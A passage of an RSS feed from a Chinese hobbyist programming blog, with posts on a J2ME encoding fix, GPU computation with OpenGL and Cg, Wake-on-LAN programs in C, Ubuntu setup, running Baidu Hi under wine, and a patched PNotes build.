<?xml version="1.0" encoding="utf-8"?>
<rss>
  <channel>
    <item>
      <title>
<![CDATA[J2ME乱码问题解决方案]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200675759130/</link>
      <description>
<![CDATA[天气:<IMG src="http://img.blog.163.com/photo/bOzunJnM668KHCP8wFpfGQ==/4278982595955566812.gif">心情:<IMG src="http://img.blog.163.com/photo/qmcxKxMQX+esO4QSENBHeQ==/5131851775388843392.gif"><BR>
<P>中国移动会给你把编码格式转换了（具体什么样我也不知道） <BR>不过你可以把你在服务器端设置返回的格式 <BR>response.setContentType("image/gif;charset=GB2312"); <BR>OutputStream objOut = null; <BR>DataOutputStream objDis = null; <BR>try { <BR>objOut = response.getOutputStream(); <BR>objDis = new DataOutputStream(objOut); <BR>objDis.writeUTF(astrReturn); <BR>objDis.close(); <BR>} catch (Exception e) { <BR>} finally { <BR>try { <BR>objDis.close(); <BR>objOut.close(); <BR>} catch (Exception e) { <BR>} <BR>} </P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>这个方法也有个问题，就是返回的时候有长度限制，好像到80k左右就内存溢出了。 <BR>我又试试修改了一下。可以用这个方法。 <BR>public void writeResponse(HttpServletResponse response, String astrReturn) throws <BR>Exception { <BR>response.setContentType("image/gif;charset=GB2312"); <BR>OutputStream objOut = null; <BR>try { <BR>objOut = response.getOutputStream(); <BR>byte[] breturn = astrReturn.getBytes("UTF-8"); <BR>objOut.write(breturn); <BR>} catch (Exception e) { <BR>e.printStackTrace(); <BR>} finally { <BR>try { <BR>objOut.close(); <BR>} catch (Exception e) { <BR>e.printStackTrace(); <BR>} <BR>} <BR>} </P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2ME</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200675759130/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用OpenGL和Cg进行简单的并行运算]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201038105620812/</link>
      <description>
<![CDATA[1. 创建FBO， 2. 绑定纹理&nbsp; 3.绘画到FBO上 4.拷贝回CPU<br>目标<br>计算数组 arrayY = alpha * arrayX.<br>Cg代码<br>float4 saxpy (<br>&nbsp;&nbsp;&nbsp; float2 coords : TEXCOORD0,<br>&nbsp;&nbsp;&nbsp; uniform samplerRECT textureX,<br>&nbsp;&nbsp;&nbsp; uniform float alpha ) : COLOR <br>{<br>&nbsp;&nbsp;&nbsp; float4 result;<br>&nbsp;&nbsp;&nbsp; float4 x = texRECT(textureX,coords);<br>&nbsp;&nbsp;&nbsp; result = alpha * x;&nbsp; <br>&nbsp;&nbsp;&nbsp; return result;<br>}<br>Cpp代码<br>/**<br>使用GPU的计算<br>1. 使用glTexSubImage2D将数据放到GPU的纹理内存里<br>2. 使用绘制将运算结果放到FBO里<br>3. 使用glReadPixels将结果读出到CPU里<br>*/<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;GL/glew.h&gt;<br>#include &lt;GL/glut.h&gt;<br>#include &lt;CG/cg.h&gt;<br>#include &lt;CG/cgGL.h&gt;<br><br>CGcontext cgContext;<br>CGprogram fragmentProgram;<br>CGprofile fragmentProfile;<br>CGparameter xParam, alphaParam;<br><br>void initCG(void) {<br>&nbsp;&nbsp;&nbsp; // set up Cg<br>&nbsp;&nbsp;&nbsp; cgContext = cgCreateContext();<br>&nbsp;&nbsp;&nbsp; fragmentProfile = cgGLGetLatestProfile(CG_GL_FRAGMENT);<br>&nbsp;&nbsp;&nbsp; cgGLSetOptimalOptions(fragmentProfile);<br>&nbsp;&nbsp;&nbsp; // create fragment program<br>&nbsp;&nbsp;&nbsp; fragmentProgram = cgCreateProgramFromFile (<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cgContext,CG_SOURCE,"test.cg", <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fragmentProfile,"saxpy",NULL);<br>&nbsp;&nbsp;&nbsp; // load program<br>&nbsp;&nbsp;&nbsp; cgGLLoadProgram (fragmentProgram);<br>&nbsp;&nbsp;&nbsp; // and get parameter handles by name<br>&nbsp;&nbsp;&nbsp; xParam = cgGetNamedParameter (fragmentProgram,"textureX");<br>&nbsp;&nbsp;&nbsp; alphaParam = cgGetNamedParameter (fragmentProgram,"alpha");<br>}<br><br>int main(int argc, char **argv) {<br>&nbsp;&nbsp;&nbsp; // 这里声明纹理的大小为：teSize;而数组的大小就必须是texSize*texSize*4<br>&nbsp;&nbsp;&nbsp; int texSize = 2;<br>&nbsp;&nbsp;&nbsp; int i;<br><br>&nbsp;&nbsp;&nbsp; // 生成测试数组的数据<br>&nbsp;&nbsp;&nbsp; float* da<wbr>ta = (float*)malloc(4*texSize*texSize*sizeof(float));<br>&nbsp;&nbsp;&nbsp; float* result = (float*)malloc(4*texSize*texSize*sizeof(float));<br>&nbsp;&nbsp;&nbsp; for (i=0; i&lt;texSize*texSize*4; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; da<wbr>ta[i] = (i+1.0)*0.01F;<br><br>&nbsp;&nbsp;&nbsp; // 初始化OpenGL的环境<br>&nbsp;&nbsp;&nbsp; glutInit (&amp;argc, argv);<br>&nbsp;&nbsp;&nbsp; glutCreateWindow("TEST1");<br>&nbsp;&nbsp;&nbsp; glewInit();//使用了OpenGL扩展，所以必须glewInit<br>&nbsp;&nbsp;&nbsp; // 视口的比例是 1:1 pixel=texel=da<wbr>ta 使得三者一一对应<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; //glFrustum(-1,1,-1,1,1,-1);<br>&nbsp;&nbsp;&nbsp; gluOrtho2D(0.0,texSize,0.0,texSize);<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; glViewport(0,0,texSize,texSize);<br><br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; // 生成并绑定FBO，也就是生成一个离屏渲染对像<br>&nbsp;&nbsp;&nbsp; GLuint fb;<br>&nbsp;&nbsp;&nbsp; glGenFramebuffersEXT(1,&amp;fb); <br>&nbsp;&nbsp;&nbsp; glBindFramebufferEXT(GL_FRAMEBUFFER_EXT,fb);<br>&nbsp;&nbsp;&nbsp; // 生成两个纹理，一个(tex)是&lt;b&gt;输入&lt;/b&gt;的纹理，一个(fboTex)是&lt;b&gt;运算结果&lt;/b&gt;的纹理<br>&nbsp;&nbsp;&nbsp; GLuint tex,fboTex;<br>&nbsp;&nbsp;&nbsp; glGenTextures (1, &amp;tex);<br>&nbsp;&nbsp;&nbsp; glGenTextures (1, &amp;fboTex);<br><br>&nbsp;&nbsp;&nbsp; //设置运算结果fboTex<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_RECTANGLE_ARB,fboTex);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_MIN_FILTER, GL_NEAREST);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_MAG_FILTER, GL_NEAREST);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_WRAP_S, GL_CLAMP);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_WRAP_T, GL_CLAMP);<br>&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_RECTANGLE_ARB,0,GL_RGBA32F_ARB,//申请内存<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; texSize,texSize,0,GL_RGBA,GL_FLOAT,0);<br><br>&nbsp;&nbsp;&nbsp; //设置输入tex<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_RECTANGLE_ARB,tex);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_MIN_FILTER, GL_NEAREST);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_MAG_FILTER, GL_NEAREST);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_WRAP_S, GL_CLAMP);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_RECTANGLE_ARB, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_WRAP_T, GL_CLAMP);<br>&nbsp;&nbsp;&nbsp; glTexEnvf(GL_TEXTURE_ENV,GL_TEXTURE_ENV_COLOR,GL_DECAL);<br>&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_RECTANGLE_ARB,0,GL_RGBA32F_ARB,//申请内存<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; texSize,texSize,0,GL_RGBA,GL_FLOAT,0);<br><br>&nbsp;&nbsp;&nbsp; //绑定FBO与运算结果，开始计算<br>&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_COLOR_ATTACHMENT0_EXT, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_TEXTURE_RECTANGLE_ARB,fboTex,0);<br><br>&nbsp;&nbsp;&nbsp; //Step1. 将输入存入显卡<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_RECTANGLE_ARB,tex);<br>&nbsp;&nbsp;&nbsp; glTexSubImage2D(GL_TEXTURE_RECTANGLE_ARB,0,0,0,texSize,texSize,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_RGBA,GL_FLOAT,da<wbr>ta);<br><br>&nbsp;&nbsp;&nbsp; //Step2 GPU-&gt;FBO, 运算应该发生在这里, 可以Enable Cg的Pro<wbr>file，实现运算<br>&nbsp;&nbsp;&nbsp; // enable texture y_old (read-on<wbr>ly)<br>&nbsp;&nbsp;&nbsp; initCG();<br>&nbsp;&nbsp;&nbsp; cgGLEnableProfile(fragmentProfile);<br>&nbsp;&nbsp;&nbsp; // bind saxpy program<br>&nbsp;&nbsp;&nbsp; cgGLBindProgram(fragmentProgram);<br>&nbsp;&nbsp;&nbsp; // enable texture x (read-on<wbr>ly)<br>&nbsp;&nbsp;&nbsp; cgGLSetTextureParameter(xParam, tex);<br>&nbsp;&nbsp;&nbsp; cgGLEnableTextureParameter(xParam);<br>&nbsp;&nbsp;&nbsp; // enable scalar alpha<br>&nbsp;&nbsp;&nbsp; cgSetParameter1f(alphaParam, 0.2f);<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTexCoord2f(0.0, 0.0); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glVertex2f(0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTexCoord2f(texSize, 0.0); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glVertex2f(texSize, 0.0);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTexCoord2f(texSize, texSize); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glVertex2f(texSize, texSize);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTexCoord2f(0.0, texSize); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glVertex2f(0.0, texSize);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glEnd();<br><br>&nbsp;&nbsp;&nbsp; //--------------------end------------------------<br><br>&nbsp;&nbsp;&nbsp; //Step3 从显卡的FBO将数据读出到CPU<br>&nbsp;&nbsp;&nbsp; glReadBuffer(GL_COLOR_ATTACHMENT0_EXT);<br>&nbsp;&nbsp;&nbsp; glReadPixels(0, 0, texSize, texSize,GL_RGBA,GL_FLOAT,result);<br><br>&nbsp;&nbsp;&nbsp; //打印输出结果<br>&nbsp;&nbsp;&nbsp; printf("Da<wbr>ta before roundtrip:\n");<br><br>&nbsp;&nbsp;&nbsp; for (i=0; i&lt;texSize*texSize*4; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%f\n",da<wbr>ta[i]);<br>&nbsp;&nbsp;&nbsp; printf("Da<wbr>ta after roundtrip:\n");<br>&nbsp;&nbsp;&nbsp; for (i=0; i&lt;texSize*texSize*4; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%f\n",result[i]);<br>&nbsp;&nbsp;&nbsp; // 释放本地内存<br>&nbsp;&nbsp;&nbsp; free(da<wbr>ta);<br>&nbsp;&nbsp;&nbsp; free(result);<br><br>&nbsp;&nbsp;&nbsp; // 释放显卡内存<br>&nbsp;&nbsp;&nbsp; glDeleteFramebuffersEXT (1,&amp;fb);<br>&nbsp;&nbsp;&nbsp; glDeleteTextures (1,&amp;tex);<br>&nbsp;&nbsp;&nbsp; glDeleteTextures(1,&amp;fboTex);<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201038105620812/</guid>
    </item>
    <item>
      <title>
<![CDATA[网络唤醒小程序]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009433275999/</link>
      <description>
<![CDATA[<P>网络开机功能主要需要主板支持, 只要主板支持, 在BIOS里设置一下, 然后发送网络包即可.</P>
<P>网络包很简单, 6个字节的magic number 0xFF,然后将要唤醒的主机Mac地址重复16遍即可,</P>
<P>6+16*6=102字节</P>
<P>Magic Number(6个字节) | Mac地址(6个字节) | Mac地址(6个字节) | ...<BR>FFFFFFFFFFFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</P>
<P>#include &lt;stdio.h&gt;<BR>#include &lt;stdlib.h&gt;<BR>#include &lt;string.h&gt;<BR>#include &lt;unistd.h&gt;<BR>#include &lt;sys/socket.h&gt;<BR>#include &lt;sys/types.h&gt;<BR>#include &lt;netinet/in.h&gt;</P>
<P>#define PORTNUM 3000 /* port number, no need&nbsp;*/<BR>#define BUFFERLEN 102 /*packet length*/<BR>#define oops(msg) {perror(msg); exit(1);}<BR>u_char* makepacket(char* mac);<BR>int main(int argc, char* argv[]){<BR>&nbsp;if(argc != 2){<BR>&nbsp;&nbsp;printf("Usage: %s [mac]\n",argv[0]);<BR>&nbsp;&nbsp;exit(0);<BR>&nbsp;}<BR>&nbsp;<BR>&nbsp;struct sockaddr_in saddr;<BR>&nbsp;int sock_id = socket(PF_INET, SOCK_DGRAM, 0);<BR>&nbsp;if(sock_id == -1)<BR>&nbsp;&nbsp;oops("socket");<BR>&nbsp;<BR>&nbsp;memset((void*)&amp;saddr, 0, sizeof(saddr));<BR>&nbsp;saddr.sin_family = AF_INET;<BR>&nbsp;saddr.sin_addr.s_addr = inet_addr("255.255.255.255");<BR>&nbsp;saddr.sin_port = htons(PORTNUM);<BR>&nbsp;u_char* packet = makepacket(argv[1]);<BR>&nbsp;printf("%s\n", packet);<BR>&nbsp;sendto(sock_id, packet, strlen(packet), 0,<BR>&nbsp;&nbsp;(struct sockaddr*)&amp;saddr, sizeof(saddr));<BR>&nbsp;free(packet);<BR>&nbsp;close(sock_id);</P>
<P>&nbsp;return 0;<BR>}<BR>u_char* makepacket(char* mac){<BR>&nbsp;int i;<BR>&nbsp;char *t;<BR>&nbsp;u_char* packet = malloc(BUFFERLEN+1);<BR>&nbsp;/* magic number */<BR>&nbsp;for(i = 0; i &lt; 6; i ++)<BR>&nbsp;&nbsp;packet[i] = 0xff;<BR>&nbsp;/* parses mac address */<BR>&nbsp;for(t = strtok(mac,"-"); t != NULL; t = strtok(NULL,"-")){<BR>&nbsp;&nbsp;packet[i++] = strtol(t, NULL, 16);<BR>&nbsp;}<BR>&nbsp;/* copy mac address */<BR>&nbsp;for(i = 12; i &lt; 102; i ++){<BR>&nbsp;&nbsp;packet[i] = packet[i%6 + 6];<BR>&nbsp;}<BR>&nbsp;packet[BUFFERLEN] = '\0';<BR>&nbsp;return packet;<BR>}<BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009433275999/</guid>
    </item>
    <item>
      <title>
<![CDATA[双网卡网络启动]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200942245642767/</link>
      <description>
<![CDATA[网络唤醒的包很容易构建，但是在网管服务器上始终不能工作，刚开始以为是程序的问题，<br>后来发现Ubuntu里有一个wakeonlan的perl脚本，在ubuntu上工作正常，而在网关上却不能正常工作<br>最后发现是好像是双网卡的问题，给wakeonlan加上一个-i参数指定内网的ip，启动成功！ <br>sudo apt-get install wakeonlan #实际就是在/usr/bin下生成一个名为wakeonlan的perl脚本，拷贝到Fedora等也可以用。<br>wakeonlan -i 192.201.0.255 00:1c:25:db:bd:46<br><br>贴上一个c语言的网络唤醒代码<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#define oops(msg) {perror(msg); exit(1);}<br><br>int main(int argc, char* argv[]){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char mac[6];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char packet[102];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sockid, i, on = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char * p = "00:1c:25:db:bd:46";/* destination host ip address*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sscanf(p, "%2x:%2x:%2x:%2x:%2x:%2x",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac, mac+1, mac+2, mac+3, mac+4, mac+5);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset(packet, 0xff, 6);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; 16; i ++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy(packet + 6*(i+1), mac, sizeof(mac));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sockid = socket(AF_INET, SOCK_DGRAM, 0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setsockopt(sockid, SOL_SOCKET, SO_BROADCAST,&amp;on, sizeof(on));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(sockid == -1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; oops("socket");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset((void*)&amp;addr, 0, sizeof(addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_family = AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_port = htons(10000);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_addr.s_addr = inet_addr("192.201.0.255");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sendto(sockid, packet, sizeof(packet), 0,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (struct sockaddr *)&amp;addr, sizeof(addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sockid);<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>}<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200942245642767/</guid>
    </item>
    <item>
      <title>
<![CDATA[给PNotes的Schedule添加农历支持]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200911103161394/</link>
      <description>
<![CDATA[<hr style="width: 100%; height: 2px;"><br><p>PNotes是sf上的一个C语言的开源桌面便笺，界面小巧漂亮，功能较强，支持日志和提醒</p>

<p>可惜和多数软件一样，不支持农历，不过好在是开源软件，自己改一下就可以了。</p><p>PNotes界面</p><br><a href="http://img618.ph.126.net/ejJnUHhgZpUW7t-xsGnNwg==/1694760834776724244.jpg" target="_blank"><img title="给PNotes的Schedule添加农历支持 - hankjin - 云水僧" alt="给PNotes的Schedule添加农历支持 - hankjin - 云水僧" src="http://img618.ph.126.net/ejJnUHhgZpUW7t-xsGnNwg==/1694760834776724244.jpg"></a><p><br></p><p>农历计划的设置界面</p><p><a href="http://img229.ph.126.net/zJFQ-U4T8j_uXquAjVOIDw==/2148498497234136939.jpg" target="_blank"><img title="给PNotes的Schedule添加农历支持 - hankjin - 云水僧" alt="给PNotes的Schedule添加农历支持 - hankjin - 云水僧" src="http://img229.ph.126.net/zJFQ-U4T8j_uXquAjVOIDw==/2148498497234136939.jpg"></a></p><p>PNotes官方网站：http://pnotes.sourceforge.net/<ci><wbr>te></ci><wbr>te></p><p>支持农历的PNotes下载地址：http://pyfarm.googlecode.com/files/PNotes.exe<br></p>
]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200911103161394/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu 8.04]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084121115538/</link>
      <description>
<![CDATA[1. apt-cache search jdk<br>apt-get install sun-jave6-jdk<br><br>2.System-&gt;Administration-&gt;Language Support-&gt;Chinese<br>im-switch -z en_US -s scim-bridge<br>logout and login<br><br>3.apt-cache search tomcat<br>apt-get install tomcat5.5<br>/etc/init.d/tomcat5.5 restart<br><br>4.apt-cache ssh<br>apt-get install openssh-server openssh-client<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084121115538/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu10.04下使用wine运行百度Hi]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720112553426758/</link>
      <description>
<![CDATA[1. 首先安装配置wine<br>sudo apt-get install wine<br>使用winetricks配置需要的库, 微软把msxml3的下载弄没了,所以要改下winetricks<br>wget http://www.kegel.com/wine/winetricks<br>sed -i "s/.*d\/msxml3.msi.*/&nbsp;&nbsp;&nbsp; w_download msxml3 http:\/\/pyfarm.googlecode.com\/svn\/trunk\/other\<br>\/msxml3.msi/g" winetricks<br>sh winetricks msxml3 gdiplus riched20 wininet<br><br>2. 然后开始安装百度Hi, 最新版的百度Hi4.1用不了, 用的是2.2<br>wget http://im.baidu.com/download/BaiduHi_2.2_Beta1.exe <br>env LANG=zh_CN.UTF-8 wine BaiduHi_2.2_Beta1.exe<br>注意最后一步, 不要选择启动Hi, 否则会出问题,<br>安装完成后进入安装文件夹, 删除自动更新文件夹<br>cd ~/.wine/drive_c/Program\ Files/baidu/Baidu\ Hi/<br>rm -fr AutoUpdate<br>然后再启动<br>env LANG=zh_CN.UTF-8 wine BaiduHi.exe<br><br>3. 最后一个问题,退出时程序崩溃,解决方法是不走平常路,用命令强制退出<br>killall BaiduHi.exe]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720112553426758/</guid>
    </item>
    <item>
      <title>
<![CDATA[放几个腾讯微博的邀请]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720104223459202/</link>
      <description>
<![CDATA[嗯，虽然好像地方不对，有点砸场子的感觉<br>http://t.qq.com/invite/daf595bb896faee39b75<br>http://t.qq.com/invite/5693b314d986e271ecc5<br>http://t.qq.com/invite/f89f91afb61684f231e7]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720104223459202/</guid>
    </item>
    <item>
      <title>
